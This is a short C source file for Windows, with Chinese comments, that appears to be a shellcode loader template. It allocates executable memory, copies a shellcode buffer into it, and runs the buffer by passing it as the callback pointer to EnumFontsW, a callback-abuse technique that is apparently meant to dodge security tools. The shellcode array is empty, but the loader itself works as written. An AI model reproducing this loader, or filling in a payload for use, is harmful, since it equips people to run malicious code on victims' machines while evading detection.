#include <Windows.h>

unsigned char shellcode[] ="";

void CallBack() {

    void* p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(p, shellcode, sizeof(shellcode));

    /*
    * EnumFontsW是Windows API，用于枚举系统中所有可用字体
    * 参数1：设备环境句柄，表示要枚举哪个设备的字体
    * 参数2：NULL表示枚举所有字体
    * 参数3：回调函数指针，用于处理每个枚举到的字体信息
    * 参数4：回调函数参数
    */
    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)p, NULL); //回调函数

}

int main() {
    CallBack();
}